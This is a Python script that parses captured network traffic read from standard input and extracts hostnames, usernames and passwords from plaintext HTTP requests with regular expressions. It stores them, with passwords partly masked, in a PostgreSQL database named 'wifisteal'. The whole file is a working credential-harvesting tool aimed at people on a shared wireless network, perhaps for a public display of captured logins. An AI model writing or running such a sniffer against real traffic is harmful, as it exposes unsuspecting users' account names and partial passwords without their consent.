from urllib.parse import unquote_plus
import sys
import re
import psycopg2


PACKET_START = re.compile(r"\d{2}:\d{2}:\d{2}.\d+ IP.*", re.I)
HOST = re.compile(r"host\s?:\s?(?P<host> .*)", re.I)
USERNAME = re.compile(r"(user|login|e?mail)[^(&|=)]*=(?P<username>[^(&|=)]*)(&|$|\s|\[)", re.I)
PASSWD = re.compile(r"pass[^(&|=)]*=(?P<pass>[^(&|=|[)]*)(&|$|\s|\[)", re.I)


DBNAME = "wifisteal"


def connect():
    conn = psycopg2.connect(database=DBNAME)
    conn.autocommit = True
    cur = conn.cursor()
    return cur


def getpkg():
    pkg = sys.stdin.readline()
    while 1:
        line = sys.stdin.readline()
        if re.match(PACKET_START, line):
            yield pkg
            pkg = line
        else:
            pkg += "\n" + line

    return pkg


def obfuscate(passwd):
    return passwd[0] + "*" * (len(passwd) - 2) + passwd[-1]


def parsepkg(pkg):
    host = re.search(HOST, pkg)
    if not host:
        return None
    host = host.groups()[0]

    username = re.search(USERNAME, pkg)
    if not username:
        return None
    username = unquote_plus(username.groups()[1])

    passwd = re.search(PASSWD, pkg)
    if not passwd:
        return None
    passwd = unquote_plus(passwd.groups()[0])

    return (host, username, obfuscate(passwd))


def main():
    cur = connect()
    for pkg in filter(None, map(parsepkg, getpkg())):
        print(pkg)
        cur.execute("INSERT INTO password (host, username, passwd) VALUES (%s, %s, %s)", pkg)



if __name__ == "__main__":
    main()
